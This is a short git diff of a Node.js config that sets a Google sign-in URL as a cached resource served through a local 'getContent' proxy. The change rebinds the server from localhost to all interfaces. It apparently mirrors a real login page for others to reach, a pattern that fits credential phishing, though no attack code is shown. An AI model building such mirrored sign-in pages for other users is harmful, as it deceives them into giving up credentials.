@@ -3,7 +3,7 @@ const path = require('path');
 const CACHED_RESOURCES_DIR = path.resolve('cached_resources');
 const BASE_URL = 'https://accounts.google.com/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'; 
 const PORT = 1000;
-const LOCAL_URL = '127.0.0.1';
+const LOCAL_URL = '0.0.0.0';
 const SCHEME = 'http'; 
 
 const CONTENT_URL = `${SCHEME}://${LOCAL_URL}:${PORT}/getContent?url=`;
